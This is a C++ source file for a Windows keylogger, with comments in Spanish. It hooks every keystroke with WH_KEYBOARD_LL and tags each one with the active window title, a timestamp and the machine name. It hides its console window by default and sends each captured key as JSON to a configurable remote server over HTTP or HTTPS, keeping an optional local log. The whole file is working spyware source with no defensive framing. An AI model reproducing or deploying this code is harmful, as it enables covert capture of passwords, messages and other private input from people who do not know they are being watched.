#define UNICODE
#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winhttp.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>
#include <string>
#include <deque>
#include <mutex>
#include <condition_variable>
#include <thread>
#include <atomic>

#pragma comment(lib, "winhttp.lib")

// ---------- Configuracion ----------
// Visibilidad de la ventana de consola.
#define invisible   // (visible / invisible)
// Esperar al arranque del sistema antes de iniciar.
#define nowait    // (bootwait / nowait)
// Formato de registro: 0 nombre legible, 10 decimal, 16 hex.
#define FORMAT 0
// Ignorar clicks de raton.
#define mouseignore

// Destino del servidor que recibira las pulsaciones.
#define SERVER_HOST  L"127.0.0.1"
#define SERVER_PORT  3000
#define SERVER_PATH  L"/api/keystroke"
#define USE_HTTPS    0   // 0 = HTTP, 1 = HTTPS

// Guardar tambien un log local como respaldo.
#define LOCAL_LOG 1

#if FORMAT == 0
const std::map<int, std::string> keyname{
    {VK_BACK,    "[BACKSPACE]"},
    {VK_RETURN,  "[ENTER]"},
    {VK_SPACE,   " "},
    {VK_TAB,     "[TAB]"},
    {VK_SHIFT,   "[SHIFT]"},
    {VK_LSHIFT,  "[LSHIFT]"},
    {VK_RSHIFT,  "[RSHIFT]"},
    {VK_CONTROL, "[CONTROL]"},
    {VK_LCONTROL,"[LCONTROL]"},
    {VK_RCONTROL,"[RCONTROL]"},
    {VK_MENU,    "[ALT]"},
    {VK_LMENU,   "[LALT]"},
    {VK_RMENU,   "[RALT]"},
    {VK_LWIN,    "[LWIN]"},
    {VK_RWIN,    "[RWIN]"},
    {VK_ESCAPE,  "[ESCAPE]"},
    {VK_END,     "[END]"},
    {VK_HOME,    "[HOME]"},
    {VK_LEFT,    "[LEFT]"},
    {VK_RIGHT,   "[RIGHT]"},
    {VK_UP,      "[UP]"},
    {VK_DOWN,    "[DOWN]"},
    {VK_PRIOR,   "[PG_UP]"},
    {VK_NEXT,    "[PG_DOWN]"},
    {VK_CAPITAL, "[CAPSLOCK]"},
    {VK_DELETE,  "[DELETE]"},
    {VK_INSERT,  "[INSERT]"},
};
#endif

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

#if LOCAL_LOG
std::ofstream output_file;
char output_filename[64];
int cur_hour = -1;
#endif

// ---------- Cola productor/consumidor para envio HTTP ----------
struct KeyEvent {
    std::string key;
    std::string window;
    std::string timestamp;
};

static std::deque<KeyEvent> g_queue;
static std::mutex g_mutex;
static std::condition_variable g_cv;
static std::atomic<bool> g_running{true};
static std::thread g_worker;
static std::string g_hostname;

static std::string JsonEscape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 8);
    for (char c : s) {
        switch (c) {
        case '"':  out += "\\\""; break;
        case '\\': out += "\\\\"; break;
        case '\b': out += "\\b";  break;
        case '\f': out += "\\f";  break;
        case '\n': out += "\\n";  break;
        case '\r': out += "\\r";  break;
        case '\t': out += "\\t";  break;
        default:
            if (static_cast<unsigned char>(c) < 0x20) {
                char buf[8];
                sprintf(buf, "\\u%04x", c);
                out += buf;
            } else {
                out += c;
            }
        }
    }
    return out;
}

static bool PostJson(const std::string& body) {
    HINTERNET hSession = WinHttpOpen(L"KeyloggerClient/1.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, SERVER_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    DWORD flags = USE_HTTPS ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", SERVER_PATH,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    LPCWSTR headers = L"Content-Type: application/json\r\n";
    BOOL ok = WinHttpSendRequest(hRequest, headers, (DWORD)-1,
        (LPVOID)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
    if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return ok == TRUE;
}

static void HttpWorker() {
    while (g_running.load()) {
        KeyEvent ev;
        {
            std::unique_lock<std::mutex> lk(g_mutex);
            g_cv.wait(lk, [] { return !g_queue.empty() || !g_running.load(); });
            if (!g_running.load() && g_queue.empty()) return;
            ev = g_queue.front();
            g_queue.pop_front();
        }

        std::string body = "{";
        body += "\"host\":\""     + JsonEscape(g_hostname)  + "\",";
        body += "\"window\":\""   + JsonEscape(ev.window)   + "\",";
        body += "\"timestamp\":\""+ JsonEscape(ev.timestamp)+ "\",";
        body += "\"key\":\""      + JsonEscape(ev.key)      + "\"";
        body += "}";

        if (!PostJson(body)) {
            // Reintento diferido: lo reencolamos y esperamos un poco.
            std::this_thread::sleep_for(std::chrono::seconds(2));
            std::lock_guard<std::mutex> lk(g_mutex);
            g_queue.push_front(ev);
        }
    }
}

static void EnqueueKey(const std::string& key, const std::string& window, const std::string& ts) {
    {
        std::lock_guard<std::mutex> lk(g_mutex);
        g_queue.push_back({ key, window, ts });
    }
    g_cv.notify_one();
}

static std::string GetHostName() {
    char name[256] = { 0 };
    DWORD size = sizeof(name);
    if (GetComputerNameA(name, &size)) return std::string(name);
    return "unknown";
}

// ---------- Captura de pulsaciones ----------
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
void SetHook() {
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
        MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
    }
}

void ReleaseHook() { UnhookWindowsHookEx(_hook); }

static std::string RenderKey(int key_stroke, HKL layout) {
#if FORMAT == 10
    char buf[16]; sprintf(buf, "[%d]", key_stroke); return buf;
#elif FORMAT == 16
    char buf[16]; sprintf(buf, "[%x]", key_stroke); return buf;
#else
    auto it = keyname.find(key_stroke);
    if (it != keyname.end()) return it->second;

    BYTE keyState[256] = {0};
    GetKeyboardState(keyState);

    UINT scanCode = MapVirtualKeyEx(key_stroke, MAPVK_VK_TO_VSC, layout);

    wchar_t wbuf[8] = {0};
    int result = ToUnicodeEx(key_stroke, scanCode, keyState, wbuf,
                             sizeof(wbuf)/sizeof(wbuf[0]), 0, layout);

    if (result > 0) {
        char utf8[32] = {0};
        int len = WideCharToMultiByte(CP_UTF8, 0, wbuf, result,
                                       utf8, sizeof(utf8)-1, NULL, NULL);
        if (len > 0) return std::string(utf8, len);
    }

    if (result == -1) {
        // Dead key (tildes, acentos): no limpiar estado,
        // la siguiente pulsacion producira el caracter combinado.
        return "";
    }

    return "";
#endif
}

int Save(int key_stroke) {
    static char lastwindow[256] = "";
#ifndef mouseignore
    if (key_stroke == 1 || key_stroke == 2) return 0;
#endif
    HWND foreground = GetForegroundWindow();
    HKL layout = NULL;
    char window_title[256] = { 0 };

    if (foreground) {
        DWORD threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
        GetWindowTextA(foreground, (LPSTR)window_title, sizeof(window_title));
    }

    struct tm tm_info;
    time_t t = time(NULL);
    localtime_s(&tm_info, &t);
    char ts[32];
    strftime(ts, sizeof(ts), "%Y-%m-%dT%H:%M:%S", &tm_info);

    std::string rendered = RenderKey(key_stroke, layout);
    if (rendered.empty()) return 0;

    // Envio al servidor
    EnqueueKey(rendered, window_title, ts);

#if LOCAL_LOG
    std::stringstream output;
    if (strcmp(window_title, lastwindow) != 0) {
        strcpy_s(lastwindow, sizeof(lastwindow), window_title);
        output << "\n\n[Window: " << window_title << " - at " << ts << "] ";
    }
    output << rendered;

    if (cur_hour != tm_info.tm_hour) {
        cur_hour = tm_info.tm_hour;
        CreateDirectoryA("logs", NULL);
        output_file.close();
        strftime(output_filename, sizeof(output_filename), "logs/%Y-%m-%d__%H-%M-%S.log", &tm_info);
        output_file.open(output_filename, std::ios_base::app);
        std::cout << "Logging output to " << output_filename << std::endl;
    }
    output_file << output.str();
    output_file.flush();
    std::cout << output.str();
#endif
    return 0;
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
        Save(kbdStruct.vkCode);
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void Stealth() {
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
#endif
#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    FreeConsole();
#endif
}

bool IsSystemBooting() {
#ifndef SM_SYSTEMDOCKED
    return false;
#else
    return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
#endif
}

int main() {
    Stealth();

#ifdef bootwait
    while (IsSystemBooting()) {
        std::cout << "System is still booting up. Waiting 10 seconds...\n";
        Sleep(10000);
    }
#endif

    g_hostname = GetHostName();
    g_worker = std::thread(HttpWorker);

    std::cout << "Keylogger iniciado. Enviando a ";
    std::wcout << SERVER_HOST << L":" << SERVER_PORT << SERVER_PATH << std::endl;
    std::cout << "Host: " << g_hostname << std::endl;

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}

    ReleaseHook();
    g_running.store(false);
    g_cv.notify_all();
    if (g_worker.joinable()) g_worker.join();
    return 0;
}
